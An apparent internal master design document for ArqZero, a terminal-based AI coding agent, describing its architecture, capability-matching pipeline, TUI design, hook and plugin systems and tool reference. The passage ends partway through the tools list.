# ArqZero Master Document

**Version:** 2.0.0
**Date:** 2026-03-22
**Author:** prana

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [How ArqZero Works](#2-how-arqzero-works)
3. [The TUI — "The Grid"](#3-the-tui--the-grid)
4. [Capability System Deep Dive](#4-capability-system-deep-dive)
5. [Tools Reference](#5-tools-reference)
6. [Slash Commands Reference](#6-slash-commands-reference)
7. [Configuration](#7-configuration)
8. [Competitive Analysis](#8-competitive-analysis)
9. [Commercial Strategy](#9-commercial-strategy)
10. [Infrastructure Architecture](#10-infrastructure-architecture)
11. [Technical Specifications](#11-technical-specifications)
12. [Roadmap](#12-roadmap)
13. [Color System](#13-color-system)
14. [Security Model](#14-security-model)
15. [Naming Conventions](#15-naming-conventions)

---

## 1. Executive Summary

### What ArqZero Is

ArqZero is a terminal-native AI coding agent built in TypeScript that operates as a structured engineering assistant rather than a chatbot wrapper. It follows real engineering methodologies — TDD, systematic debugging, code review checklists, migration protocols — through a labs-native capability pipeline that automatically matches 42 structured capabilities to user tasks. Users bring their own LLM API key (any OpenAI-compatible provider), and ArqZero provides the intelligence layer: 18 tools for file manipulation, shell execution, and web research; a subagent dispatch system for parallel work; cross-session memory; verification gates that prevent half-done work; and a distinctive terminal UI called "The Grid" built on Ink (React for the terminal).

### The Vision

ArqZero will become the definitive terminal-native coding agent — the tool that professional developers install first in every environment. The trajectory:

1. **Now:** npm CLI with BYOK model, any OpenAI-compatible LLM provider
2. **Next:** Commercial launch with tiered pricing (Free / Pro $12/mo / Team $30/user/mo), open-core on npm, license validation, website at arqzero.dev
3. **Then:** VS Code extension, native Anthropic adapter, team features, plugin marketplace
4. **Later:** Web app (browser-based ArqZero), Android companion, enterprise, API-as-a-service

### Current Status

- **Codebase:** 155 TypeScript source files across 20 modules
- **Tests:** 698 tests across 68 test files, all passing
- **Tools:** 18 built-in tools + MCP support for external tool servers
- **Capabilities:** 42 structured capabilities across 6 categories
- **Slash commands:** 25+ built-in + custom commands from `.arqzero/commands/`
- **Provider:** Fireworks AI (GLM-4.7, 400B parameter model) via OpenAI-compatible adapter; supports any OpenAI-compatible endpoint
- **TUI:** Fully functional with shimmer spinner, inline diffs, permission prompts, markdown rendering, syntax highlighting
- **Stage:** Pre-commercial. Feature-complete for v1. Needs licensing, feature gating, and website for launch.

---

## 2. How ArqZero Works

### Architecture Overview

ArqZero is organized into 20 modules, each handling a distinct concern:

```
bin/
  arq.ts              Entry point (development)
  arqzero.mjs         Entry point (npm package)

src/
  api/                LLM provider adapters
  agents/             Subagent system (dispatch, runner, prompt builder)
  checkpoints/        File state snapshots and rewind
  cli/                TUI components, args, headless mode, theme
  commands/           Slash command registry and builtins
  config/             Schema, loader, settings hierarchy, env vars
  core/               Conversation engine, compaction, system prompt
  hooks/              Event system (pre/post tool use, session lifecycle)
  mcp/                Model Context Protocol bridge and client
  memory/             Cross-session persistence
  permissions/        Permission manager, escalation rules
  plugins/            Plugin manifest, loader, manager
  registry/           42 capabilities, keyword matcher, injector
  session/            Session management, context window, history
  skills/             Skill parser, loader, commands
  system/             Machine ID generation
  tools/              Tool types, registry, executor, path guard, validation
  worktrees/          Git worktree management
```

### The Conversation Loop

Every interaction follows this pipeline:

```
User types message
       |
       v
[1] Keyword extraction from message
       |
       v
[2] Match against 42 capabilities (suffix stemming, scoring)
       |
       v
[3] Select top 8 matches, resolve dependencies (requires/recommends)
       |
       v
[4] Build capability context (methodology steps, architecture constraints,
    domain hints, guardrails, verification gates, dispatch hints)
       |
       v
[5] Append capability context to system prompt
       |
       v
[6] Send message history + system prompt + tool definitions to LLM
       |
       v
[7] Stream response (text deltas, thinking deltas, tool use blocks)
       |
       v
[8] For each tool_use block:
    a. Fire PreToolUse hook (can deny/modify)
    b. Check permissions (safe/ask/dangerous)
    c. Execute tool
    d. Fire PostToolUse hook
    e. Capture checkpoint (for Write/Edit/MultiEdit)
       |
       v
[9] Add tool results to message history
       |
       v
[10] Send tool results back to LLM (recursive — up to 25 rounds)
       |
       v
[11] When LLM responds with text only (no tool_use), turn is complete
       |
       v
[12] Fire Stop hook
       |
       v
[13] Check context window health:
     - 90%: warn user
     - 95%: auto-compact (summarize old messages, preserve recent 20%)
       |
       v
[14] Persist session to disk
```

This loop is implemented in `src/core/engine.ts` in the `ConversationEngine` class. The engine's `handleUserMessage` method orchestrates steps 1-14, and `runConversationLoop` handles the recursive tool execution in steps 6-11.

### The Labs-Native Pipeline

ArqZero's defining architectural decision is the labs-native capability pipeline. Unlike competitors that send raw user messages to the LLM, ArqZero interprets the user's intent before the LLM sees it.

The pipeline works in four stages:

**Stage 1: Keyword Extraction**
The user's message is tokenized and each word is stemmed using a suffix-stripping algorithm (removes `-ing`, `-ed`, `-er`, `-tion`, `-ment`, `-ly`, `-ness`, `-ize`, `-ise`, `-ation`, `-able`, `-ible`). Multi-word triggers are matched as substrings.

**Stage 2: Capability Matching**
Each word (and its stem) is compared against the trigger lists of all 42 capabilities. Exact matches score 1.0; stemmed matches score 0.5. Results are sorted by category priority (methodology > architecture > domain > guardrail > orchestration > tool), then by phase number, then by score.

**Stage 3: Selection and Dependency Resolution**
The top 8 matches are selected to prevent context bloat. Hard dependencies (`requires`) are automatically pulled in — for example, if `tdd` is matched, `testing-standards` is also loaded because TDD requires it. Soft dependencies (`recommends`) are added if there's room under the cap of 8.

**Stage 4: Context Injection**
The selected capabilities are rendered into structured text and appended to the system prompt. The rendering groups capabilities by category:
- **Workflow** (methodology) — numbered step-by-step protocols
- **Architecture Constraints** — structural rules
- **Technology Context** (domain) — language/framework-specific guidance with suggested tools
- **Guardrails** — quality gates with mandatory steps
- **Parallelization** (orchestration) — when to use the Dispatch tool
- **Suggested Tools** — tool recommendations
- **Verification Gates (MANDATORY)** — always rendered last, with explicit "Do NOT claim completion until all gates pass"

Implementation: `src/registry/matcher.ts` (matching), `src/registry/injector.ts` (rendering), `src/registry/capabilities.ts` (definitions).

### Tool System

ArqZero has 18 built-in tools plus support for external tools via MCP.

**Registration:** All built-in tools are registered through the barrel file `src/tools/builtins/index.ts`. Each tool is an object implementing the `Tool` interface:

```typescript
interface Tool {
  name: string;
  description: string;
  inputSchema: Record<string, unknown>;
  permissionLevel: PermissionLevel;  // 'safe' | 'ask' | 'dangerous'
  execute(input: unknown, ctx: ToolContext): Promise<ToolResult>;
}
```

**Execution:** The `ToolExecutor` (`src/tools/executor.ts`) handles execution:
1. Look up the tool in the registry
2. Check permissions via `PermissionManager`
3. If permission is granted, call `tool.execute(input, ctx)`
4. If permission is denied, return a denial message
5. If the tool is Write/Edit/MultiEdit, capture a checkpoint before execution

**ToolContext:** Every tool receives a context object with:
- `cwd` — current working directory
- `config` — the full `AppConfig`
- `promptUser` — function to ask the user for permission
- `agentRunner` — optional reference for Dispatch tool

**ToolResult:** Tools return:
- `content` — text result sent back to the LLM
- `isError` — whether this is an error
- `display` — metadata for UI rendering (language, truncated flag, line count)
- `metadata` — UI-only data not sent to the model (file path, old/new content for diffs)

### Session Management

**Auto-save:** Every message (user, assistant, tool result) is persisted to disk via `appendMessage()` in `src/session/history.ts`. Sessions are stored in `~/.arqzero/sessions/`.

**Resume:** The `-c` / `--continue` flag loads the last session. `--resume <session-id>` loads a specific session. The engine's `setMessages()` method restores the conversation history.

**Context window tracking:** The `ContextWindow` class (`src/session/context.ts`) tracks token usage:
- Default max: 200,000 tokens
- Compaction threshold: 95% (triggers auto-compaction)
- Critical warning: 90%
- Preserve ratio: 20% of recent messages kept verbatim

**Compaction:** When the context window hits 95%, the engine sends older messages to the LLM with a summarization prompt and replaces them with the summary. The summary + preserved recent messages become the new history. This is implemented in `src/core/compaction.ts`.

### Memory System

Cross-session memory persists learnings in `~/.arqzero/memory/`. Each memory entry has:

```typescript
interface MemoryEntry {
  name: string;          // unique identifier
  description: string;   // what this memory is about
  type: MemoryType;      // 'user' | 'feedback' | 'project' | 'reference'
  content: string;       // the actual memory content
  filePath: string;      // path on disk
}
```

The `MemoryStore` (`src/memory/store.ts`) provides CRUD operations: `save()`, `load()`, `loadAll()`, `remove()`, `search()`.

The `MemoryInjector` (`src/memory/injector.ts`) loads relevant memories and appends them to the system prompt, staying within a token budget.

The `/memory` slash command lists and inspects memories.

### Hook System

Hooks are event-driven interceptors that fire at lifecycle points. There are 11 hook events:

| Event | When It Fires | Can Block? |
|---|---|---|
| `PreToolUse` | Before tool execution | Yes (deny) |
| `PostToolUse` | After successful tool execution | No |
| `PostToolUseFailure` | After failed tool execution | No |
| `UserPromptSubmit` | When user submits a message | No |
| `Stop` | When conversation turn ends | No |
| `DispatchStop` | When a subagent completes | No |
| `SessionStart` | When session begins | No |
| `SessionEnd` | When session ends | No |
| `PreCompact` | Before context compaction | No |
| `PostCompact` | After context compaction | No |
| `Notification` | Generic notification event | No |

Each hook has two handler types:
- **command** — runs a shell command with JSON payload on stdin, parses JSON result from stdout
- **http** — POSTs JSON payload to a URL, parses JSON response

Hooks are defined in settings or plugin manifests:

```typescript
interface HookDefinition {
  event: HookEvent;
  type: HookHandlerType;
  command?: string;
  url?: string;
  timeout?: number;
  matchTools?: string[];  // filter: only fire for specific tools
}
```

The `PreToolUse` hook is special: it returns a `HookResult` with `action: 'allow' | 'deny' | 'continue'` and can optionally modify the tool input via `modifiedInput`.

Implementation: `src/hooks/registry.ts`, `src/hooks/command-handler.ts`, `src/hooks/http-handler.ts`.

### Plugin System

Plugins extend ArqZero with additional skills, agents, hooks, and MCP servers. A plugin is a directory containing a `plugin.json` manifest:

```typescript
interface PluginManifest {
  name: string;
  version: string;
  description: string;
  skills?: string[];              // paths to skill .md files
  agents?: string[];              // paths to agent .md files
  hooks?: HookDefinition[];       // hook registrations
  mcpServers?: Record<string, McpServerConfig>;  // MCP servers to connect
}
```

The `PluginLoader` (`src/plugins/loader.ts`) scans for plugins, and the `PluginManager` (`src/plugins/manager.ts`) handles enable/disable and reload. Plugins are managed via `/plugin` and `/reload-plugins` slash commands.

### Subagent Dispatch

The Dispatch tool (`src/tools/builtins/task.ts`) spawns autonomous sub-agents, each with their own `ConversationEngine`, message history, tool access, and optional model override.

Key constraints:
- Maximum 7 concurrent agents
- Each agent gets an isolated conversation context
- Tool access can be restricted per agent via `allowedTools`
- Custom agents can be defined in `~/.arqzero/agents/` as `.md` files with YAML frontmatter

The `AgentRunner` (`src/agents/runner.ts`) manages the lifecycle of sub-agents. The `PromptBuilder` (`src/agents/prompt-builder.ts`) constructs task-specific system prompts.

Agent definitions:

```typescript
interface AgentDefinition {
  name: string;
  description: string;
  systemPrompt?: string;
  allowedTools?: string[];
  model?: string;
}
```

### MCP Support

ArqZero supports the Model Context Protocol for connecting to external tool servers. MCP servers are configured in `config.json` or `settings.json`:

```json
{
  "mcpServers": {
    "my-server": {
      "command": "npx",
      "args": ["-y", "my-mcp-server"],
      "env": { "API_KEY": "..." }
    }
  }
}
```

The `McpBridge` (`src/mcp/bridge.ts`) creates ArqZero `Tool` adapters from MCP tools. Each MCP tool gets a name following the convention `mcp__<server>__<toolname>` and defaults to `ask` permission level.

The `McpClientManager` (`src/mcp/client.ts`) handles connecting to MCP servers, listing available tools, and calling them.

---

## 3. The TUI — "The Grid"

### Visual Identity

ArqZero's TUI is called **The Grid**. It is a command center, not a messenger app. The design language draws from terminal-native tools like lazygit, btop, and k9s — not web chat UIs.

Key visual principles:
- **Teal brand accent** (`#00D4AA`) — used sparingly: prompt symbol + one active state per screen
- **Warm neutral chrome** — background `#1a1a1a`, text levels in warm greys (`#D4D4D4`, `#6B7280`, `#374151`)
- **No chat bubbles** — content flows like a terminal log
- **Monospace everything** — this is a terminal tool
- **Status always visible** — model, tokens, cost, active operations in the header

### Component Architecture

The TUI is built with Ink (React for the terminal). All components live in `src/cli/components/`:

| Component | File | Purpose |
|---|---|---|
| `Header` | `Header.tsx` | Status bar: model name, token count, cost, context meter |
| `OperationLog` | `OperationLog.tsx` | Scrollable feed of tool calls and text output |
| `OperationEntry` | `OperationEntry.tsx` | Single operation: tool call with timing and result |
| `GroupedOperationEntry` | `GroupedOperationEntry.tsx` | Collapsed group of related operations |
| `CommandInput` | `CommandInput.tsx` | Multi-line input with `◆ arq ›` prompt |
| `Footer` | `Footer.tsx` | Keyboard shortcut hints |
| `PermissionInline` | `PermissionInline.tsx` | Inline [y/n/a] permission prompt with diff preview |
| `DiffView` | `DiffView.tsx` | Inline colored diff display for file edits |
| `Spinner` | `Spinner.tsx` | Shimmer animation during LLM streaming |
| `SlashSuggestions` | `SlashSuggestions.tsx` | Tab-complete dropdown for slash commands |
| `TranscriptView` | `TranscriptView.tsx` | Full conversation transcript display |

The barrel file `src/cli/components/index.ts` re-exports all components.

### Layout

```
┌──────────────────────────────────────────────────────────────┐
│  ◆ ArqZero                     glm-4p7 │ 2.4k tokens │ $0.01 │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ● read src/index.ts                                    0.2s │
│  ● edit src/index.ts (+3 -1)                            0.1s │
│    ⎿ - const x = 1;                                         │
│    ⎿ + const x = computeValue();                            │
│    ⎿ + const y = x * 2;                                     │
│    ⎿ + const z = y + 1;                                     │
│                                                              │
│  Added computeValue() and derived variables for the          │
│  calculation pipeline.                                       │
│                                                              │
│  ● bash npm test                                        1.4s │
│    ⎿ 12 passing, 0 failing                                  │
│                                                              │
│  All tests pass. The refactor is complete.                   │
│                                                              │
├──────────────────────────────────────────────────────────────┤
│  ◆ arq ›                                                     │
└──────────────────────────────────────────────────────────────┘
```

### Shimmer Spinner Animation

The spinner is ArqZero's signature visual element. During LLM streaming, it displays:
- A per-character color wave that shifts every 50ms, creating a shimmer effect across the text
- The text rotates through 83 whimsical engineering verbs (see full list below)
- A dot blinks at 600ms intervals
- Uses the brand color palette: `#00D4AA` (brand) to `#4EECD0` (brandLight)

The 83 spinner verbs:

```
Architecting, Assembling, Blueprinting, Bootstrapping, Brewing,
Building, Calibrating, Calculating, Cascading, Channeling,
Churning, Compiling, Computing, Configuring, Constructing,
Converging, Crafting, Crunching, Debugging, Decoding,
Deploying, Designing, Dispatching, Encoding, Engineering,
Executing, Fabricating, Forging, Generating, Gridlining,
Hashing, Indexing, Initializing, Integrating, Iterating,
Launching, Loading, Machining, Manufacturing, Mapping,
Materializing, Meshing, Modeling, Navigating, Networking,
Optimizing, Orchestrating, Parsing, Patching, Pipelining,
Processing, Profiling, Programming, Propagating, Prototyping,
Quantizing, Querying, Reasoning, Refactoring, Rendering,
Resolving, Routing, Scaffolding, Scanning, Sequencing,
Serializing, Shaping, Solving, Sorting, Spawning,
Spinning, Structuring, Synthesizing, Threading, Tokenizing,
Tracing, Transforming, Traversing, Tuning, Vectorizing,
Welding, Wiring, Zeroing
```

Implementation: `src/cli/components/Spinner.tsx`, verb list in `src/cli/theme.ts`.

### Markdown Rendering

ArqZero renders full Markdown in the terminal using `marked` + `marked-terminal`:
- Headings, bold, italic, strikethrough
- Code blocks with syntax highlighting via `highlight.js`
- Lists (ordered and unordered)
- Links (displayed as text with URL)
- Blockquotes

The markdown renderer is in `src/cli/markdown.ts`.

### Tool Display

Tool operations use a distinctive visual language:
- `●` (filled circle) — tool status dot. Green (`#3AAF60`) for success, red (`#D04545`) for error
- `⎿` (tree branch) — indented output lines from tool results
- Tool names are color-coded: file tools in blue (`#4A7CF0`), Bash in magenta (`#D42E8A`)
- Each operation shows elapsed time in seconds

Grouped operations (e.g., multiple edits to the same file) collapse under a `GroupedOperationEntry`.

### Slash Command Autocomplete

When the user types `/`, the `SlashSuggestions` component shows a dropdown of matching commands. Tab cycles through suggestions. The dropdown updates as the user types more characters.

Implementation: `src/cli/components/SlashSuggestions.tsx`.

### Permission Prompts

When a tool requires permission (`ask` or `dangerous` level), ArqZero shows an inline permission prompt:
- A bordered box with the tool name and input summary
- For file-modifying tools (Edit, Write), a diff preview is shown
- Three options: `[y]` yes (green), `[n]` no (red), `[a]` always for this session (blue)
- The border color reflects the permission level
- Dangerous commands (detected by pattern matching) get an additional warning

Implementation: `src/cli/components/PermissionInline.tsx`.

### Keyboard Shortcuts

| Shortcut | Action |
|---|---|
| `Enter` | Submit message |
| `Shift+Enter` | New line in input |
| `Escape` | Cancel current input / abort operation |
| `Ctrl+C` | Abort current operation |
| `Ctrl+L` | Clear screen |
| `Tab` | Cycle slash command suggestions |
| `Up/Down` | Scroll through input history |
| `PgUp/PgDn` | Scroll operation log |

Input history is persisted across sessions via the `useInputHistory` hook (`src/cli/hooks/useInputHistory.ts`).

### Context Meter

The header includes a visual context meter showing how full the context window is:
- `#3AAF60` (green) — healthy (0-89%)
- `#C47F00` (amber) — caution (90-94%)
- `#C83030` (red) — critical (95%+, compaction imminent)
- `#0d1520` — track background

The meter is displayed as: `[████████░░░░] 67%`

---

## 4. Capability System Deep Dive

### The 6 Categories

| Category | Count | Purpose | Priority |
|---|---|---|---|
| **methodology** | 8 | Multi-step imperative protocols (how to work) | 1 (highest) |
| **architecture** | 7 | Structural patterns and system design | 2 |
| **domain** | 11 | Language/ecosystem expertise | 3 |
| **guardrail** | 6 | Quality gates with verification steps | 4 |
| **orchestration** | 5 | Multi-agent dispatch patterns | 5 |
| **tool** | 5 | Tool-centric capabilities | 6 (lowest) |

Priority determines injection order: methodology capabilities are always rendered first in the system prompt, ensuring the LLM follows the workflow before considering architecture or domain details.

### All 42 Capabilities

#### Methodology (8)

| Name | Description | Triggers | Phase | Dependencies |
|---|---|---|---|---|
| `planning` | Break complex tasks into an explicit plan before implementation | plan, design, architect, strategy, roadmap, blueprint, decompose | 10 | — |
| `tdd` | Test-driven development: red-green-refactor cycle | tdd, test-driven, test first, red green | 20 | requires: testing-standards |
| `debugging` | Systematic bug investigation and resolution | bug, fix, error, broken, crash, fail, debug, issue, stack trace, exception | 20 | — |
| `refactoring` | Improve code structure without changing behavior | refactor, clean, simplify, restructure, deduplicate, extract | 30 | requires: testing-standards |
| `code-review` | Review code for quality, security, and maintainability | review, audit, check quality, lint, smell, pr review | 40 | — |
| `migration` | Migrate or upgrade codebases across versions safely | migrate, upgrade, version bump, breaking change, deprecat | 30 | requires: testing-standards |
| `scaffolding` | Bootstrap new projects or modules from scratch | scaffold, init, setup, bootstrap, new project, create project, starter | 10 | — |
| `incident-response` | Triage and resolve production incidents quickly | incident, outage, down, emergency, hotfix, rollback, revert | 10 | requires: debugging |

Each methodology capability contains a numbered step-by-step protocol (8-10 steps) that the LLM must follow in order. For example, the `debugging` capability's protocol:

1. Reproduce the bug — get a reliable repro case before anything else.
2. Read the full error message and stack trace; identify the exact file and line.
3. Form a hypothesis about the root cause (not the symptom).
4. Add logging or a minimal test to confirm the hypothesis.
5. If the hypothesis is wrong, return to step 3 with new evidence.
6. Implement the smallest fix that addresses the root cause.
7. Run the repro case and confirm the bug is gone.
8. Run the full test suite to confirm no regressions.
9. Remove any temporary logging added during investigation.
10. If the bug could recur, add a regression test.

#### Architecture (7)

| Name | Description | Key Triggers | Suggested Tools |
|---|---|---|---|
| `backend-patterns` | API and server-side architecture patterns | api, server, endpoint, route, middleware, rest, graphql | Read, Edit, Bash, Grep |
| `frontend-architecture` | Frontend and UI component architecture | react, component, ui, css, layout, jsx, tsx, frontend | Read, Edit, Glob, Grep |
| `database-design` | Database schema, query, and migration patterns | database, db, sql, query, migration, schema, postgres, orm | Read, Edit, Bash |
| `event-driven` | Event-driven and message-based architecture | event, queue, pubsub, message broker, kafka, webhook | Read, Edit, Bash |
| `microservices` | Microservice decomposition and service mesh patterns | microservice, service mesh, api gateway, distributed | Read, Edit, Bash |
| `data-pipeline` | ETL, batch, and stream processing pipelines | pipeline, etl, data flow, transform, batch, stream processing | Read, Edit, Bash |
| `cli-design` | Command-line interface and TUI design patterns | cli, command line, argument parsing, terminal, tui | Read, Edit, Bash |

Architecture capabilities inject concise structural guidance. For example, `backend-patterns` injects: "Follow layered architecture: routes -> controllers -> services -> data access. Keep business logic out of route handlers."

#### Domain (11)

| Name | Description | Key Triggers |
|---|---|---|
| `typescript` | TypeScript language expertise | typescript, ts, tsconfig, type error, generics |
| `node` | Node.js runtime and ecosystem | node, nodejs, npm, package.json, esm, commonjs |
| `python` | Python language and ecosystem | python, py, pip, venv, django, flask, fastapi |
| `react` | React framework patterns | react, useState, useEffect, jsx, next.js |
| `css-styling` | CSS, preprocessors, and styling systems | css, scss, tailwind, styled-components |
| `docker` | Docker containers and orchestration | docker, dockerfile, container, kubernetes, k8s |
| `git-ops` | Git version control operations | git, commit, branch, merge, rebase, pr |
| `ci-cd` | Continuous integration and deployment | ci, cd, github actions, workflow, deploy |
| `cloud-infra` | Cloud infrastructure and services | aws, gcp, azure, terraform, lambda, s3 |
| `documentation` | Technical writing and documentation | doc, docs, readme, document, jsdoc |
| `shell-scripting` | Shell scripts and command-line automation | bash, shell, script, zsh, awk, sed, makefile |

#### Guardrail (6)

| Name | Description | Verification Gate Steps | Fail Action |
|---|---|---|---|
| `security-review` | OWASP-aligned security review | Run npm audit, Grep for hard-coded secrets, Confirm findings addressed | report |
| `performance-audit` | Profile and optimize performance | Profile before, Profile after, Compare delta | report |
| `accessibility-check` | WCAG accessibility standards | Check ARIA labels, Verify color contrast, Confirm keyboard navigation | report |
| `error-handling` | Comprehensive error handling | Check all async operations, Test error paths | retry |
| `input-validation` | Validate and sanitize all input | Test with malformed data, Confirm error messages | retry |
| `testing-standards` | Test quality and coverage standards | Run full suite, Confirm no skipped tests, Report pass/fail count | retry |

Guardrail capabilities are unique because they include **verification gates** — mandatory completion checks that the LLM must execute before telling the user the task is done. The fail action determines what happens when a gate fails:
- `retry`: Fix the issue and re-verify
- `report`: Report the failures explicitly to the user

#### Orchestration (5)

| Name | Description | When to Dispatch | Max Concurrent |
|---|---|---|---|
| `parallel-quality` | Run lint, typecheck, and test in parallel | Comprehensive quality check | 3 |
| `parallel-implementation` | Fan out implementation, fan in verification | Multiple independent files need similar changes | 5 |
| `phased-deploy` | Multi-phase deployment with checks | Deploying to production | 1 |
| `review-sweep` | One review agent per file in a changeset | Large changeset needs review | 7 |
| `multi-stack` | Parallel frontend and backend development | Feature requires coordinated work | 2 |

Orchestration capabilities contain **dispatch hints** — structured recommendations for when and how to use the Dispatch tool for parallel sub-agent work.

#### Tool (5)

| Name | Description | Suggested Tools |
|---|---|---|
| `file-operations` | File reading, writing, editing, and navigation | Read, Write, Edit, MultiEdit, Glob, LS |
| `search` | Code and file search across the project | Glob, Grep, Read |
| `shell` | Shell command execution and process management | Bash, BashOutput, KillShell |
| `web-research` | Web search and content fetching | WebSearch, WebFetch |
| `notebook` | Jupyter notebook reading and editing | NotebookRead, NotebookEdit |

Tool capabilities suggest which tools are best suited for the task.

### Keyword Matching with Suffix Stemming

The matching algorithm (`src/registry/matcher.ts`) uses a custom suffix-stripping stemmer. Suffixes removed (iteratively):

```
-ing, -ed, -er, -tion, -ment, -ly, -ness, -ize, -ise, -ation, -able, -ible
```

Stemming rules:
- Minimum remaining length: `suffix.length + 2` characters (prevents over-stemming short words)
- Iterative: suffixes are stripped repeatedly until no more match
- Stem comparison: two stems match if one is a prefix of the other and the prefix is at least 4 characters

This means "debugging" matches trigger "debug" (stem "debug" vs stem "debug"), and "optimizing" matches trigger "optimize" (stem "optim" is prefix of "optim").

Scoring:
- Exact match: 1.0 points
- Stemmed match: 0.5 points
- Multi-word triggers (e.g., "test first"): matched as substrings, score 1.0

### Dependency Chains

Capabilities can declare two types of dependencies:

- `requires` — hard dependency. If capability A requires B, and A is matched, B is automatically included even if it was not matched by keywords.
- `recommends` — soft dependency. Included only if there is room under the 8-capability cap.

Current dependency chains:

```
tdd → requires: testing-standards
refactoring → requires: testing-standards
migration → requires: testing-standards
incident-response → requires: debugging
phased-deploy → requires: testing-standards, security-review
backend-patterns → recommends: security-review, error-handling
frontend-architecture → recommends: accessibility-check
database-design → recommends: performance-audit, input-validation
```

### Verification Gates

Verification gates are mandatory completion checks attached to guardrail capabilities. They are always rendered last in the injected context, preceded by the heading "Verification Gates (MANDATORY)" and followed by "Do NOT claim completion until all gates pass."

Each gate has:
- `steps` — array of required verification steps
- `failAction` — `retry` (fix and re-verify) or `report` (report failures explicitly)

The system prompt explicitly instructs the LLM: "When a Verification Gate section appears, you MUST complete those steps before telling the user the task is done. Skipping verification is never acceptable."

### Dispatch Hints

Orchestration capabilities contain dispatch hints that tell the LLM when to use the Dispatch tool:

```typescript
interface DispatchHint {
  when: string;         // condition for dispatching
  tasks: string[];      // sub-tasks to dispatch
  maxConcurrent?: number;  // parallel limit
}
```

These are rendered in the system prompt under "### Parallelization" with explicit numbered task lists.

### How Capabilities Are Injected into the System Prompt

The capability context is appended to the base system prompt before each LLM call. The `buildCapabilityContext()` function (`src/registry/injector.ts`) renders the matched capabilities into this structure:

```
## Active Capabilities

### Workflow
**planning**
1. Restate the goal...
2. List hard constraints...

### Architecture Constraints
**backend-patterns**: API and server-side architecture patterns
Follow layered architecture...

### Technology Context
- **typescript** (tools: Read, Edit, Bash, Grep)

### Guardrails
**security-review**: OWASP-aligned security review
1. Check for injection vulnerabilities...

### Parallelization
WHEN: User requests a comprehensive quality check
USE Dispatch to run in parallel:
1. Run linter
2. Run type checker
3. Run test suite

### Suggested Tools: Read, Edit, Bash, Grep

### Verification Gates (MANDATORY)
Before reporting completion, you MUST complete these steps:

**security-review**:
1. Run npm audit (or equivalent) and review findings
2. Grep for hard-coded secrets, API keys, and passwords
3. Confirm all findings are addressed or documented as accepted risk
On failure: report failures explicitly

Do NOT claim completion until all gates pass.
```

---

## 5. Tools Reference

### All 18 Tools

#### Read

| Property | Value |
|---|---|
| **Name** | `Read` |
| **Permission** | `safe` |
| **Description** | Reads a file from the filesystem with line numbers |
| **Input** | `file_path` (string, required), `offset` (number, optional), `limit` (number, optional) |
| **Behavior** | Resolves path via path guard, reads file, adds line numbers, detects language for syntax hint |

#### Write

| Property | Value |
|---|---|
| **Name** | `Write` |
| **Permission** | `ask` |
| **Description** | Creates or overwrites a file with the provided content |
| **Input** | `file_path` (string, required), `content` (string, required) |
| **Behavior** | Guards path, creates parent directories if needed, writes content, returns diff metadata |

#### Edit

| Property | Value |
|---|---|
| **Name** | `Edit` |
| **Permission** | `ask` |
| **Description** | Performs exact string replacement in a file |
| **Input** | `file_path` (string, required), `old_string` (string, required), `new_string` (string, required), `replace_all` (boolean, optional) |
| **Behavior** | Guards path, reads file, validates old_string exists and is unique (unless replace_all), replaces, writes back, returns diff metadata |

#### MultiEdit

| Property | Value |
|---|---|
| **Name** | `MultiEdit` |
| **Permission** | `ask` |
| **Description** | Applies multiple sequential edits to a single file |
| **Input** | `file_path` (string, required), `edits` (array of `{old_string, new_string}`, required) |
| **Behavior** | Guards path, applies each edit sequentially (each validates old_string exists), writes final result |

#### Bash

| Property | Value |
|---|---|
| **Name** | `Bash` |
| **Permission** | `ask` (escalates to `dangerous` for destructive commands) |
| **Description** | Executes a shell command |
| **Input** | `command` (string, required), `timeout` (number, optional), `cwd` (string, optional) |
| **Behavior** | Checks for interactive commands (blocks vim/nano/python REPL), resolves timeout (default 30s, max 600s), runs via spawnSync, returns stdout+stderr |

#### BashOutput

| Property | Value |
|---|---|
| **Name** | `BashOutput` |
| **Permission** | `safe` |
| **Description** | Reads stdout/stderr from a running or completed bash process |
| **Input** | `process_id` (string, required) |
| **Behavior** | Retrieves output from tracked processes |

#### KillShell

| Property | Value |
|---|---|
| **Name** | `KillShell` |
| **Permission** | `ask` |
| **Description** | Kills a running bash process by ID |
| **Input** | `process_id` (string, required) |
| **Behavior** | Terminates the tracked process |

#### Glob

| Property | Value |
|---|---|
| **Name** | `Glob` |
| **Permission** | `safe` |
| **Description** | Finds files matching a glob pattern |
| **Input** | `pattern` (string, required), `path` (string, optional) |
| **Behavior** | Uses fast-glob with ignore patterns for node_modules and .git |

#### Grep

| Property | Value |
|---|---|
| **Name** | `Grep` |
| **Permission** | `safe` |
| **Description** | Searches file contents using a regex pattern |
| **Input** | `pattern` (string, required), `path` (string, optional), `glob` (string, optional), `output_mode` (`content` / `files_with_matches` / `count`, optional) |
| **Behavior** | Scans files matching glob, applies regex, returns results in specified format |

#### LS

| Property | Value |
|---|---|
| **Name** | `LS` |
| **Permission** | `safe` |
| **Description** | Lists directory contents with file sizes and types |
| **Input** | `path` (string, optional) |
| **Behavior** | Lists directory entries with type indicators and sizes |

#### WebSearch

| Property | Value |
|---|---|
| **Name** | `WebSearch` |
| **Permission** | `safe` |
| **Description** | Searches the web and returns results |
| **Input** | `query` (string, required) |
| **Behavior** | Fetches search results from Bing, parses HTML to extract titles, URLs, and snippets, returns up to 10 results |

#### WebFetch

| Property | Value |
|---|---|
| **Name** | `WebFetch` |
| **Permission** | `safe` |
| **Description** | Fetches a URL and returns its content |
| **Input** | `url` (string, required), `max_length` (number, optional, default 50000) |
| **Behavior** | Fetches URL, strips HTML to plain text, truncates to max_length |

#### Prompt (AskUser)

| Property | Value |
|---|---|
| **Name** | `Prompt` |
| **Permission** | `safe` |
| **Description** | Asks the user a question and returns their response |
| **Input** | `question` (string, required) |
| **Behavior** | Displays question to user, waits for input, returns response |

#### Dispatch

| Property | Value |
|---|---|
| **Name** | `Dispatch` |
| **Permission** | `ask` |
| **Description** | Launches a sub-agent to handle a complex task autonomously |
| **Input** | `prompt` (string, required), `description` (string, optional), `model` (string, optional), `allowed_tools` (string[], optional) |
| **Behavior** | Spawns an isolated AgentRunner with its own ConversationEngine, returns the agent's final response |

#### TodoWrite

| Property | Value |
|---|---|
| **Name** | `TodoWrite` |
| **Permission** | `safe` |
| **Description** | Creates or updates a structured task list |
| **Input** | `todos` (array of `{id, task, status}`, required) |
| **Behavior** | Persists task list to in-memory store, status: pending/in_progress/completed |

#### TodoRead

| Property | Value |
|---|---|
| **Name** | `TodoRead` |
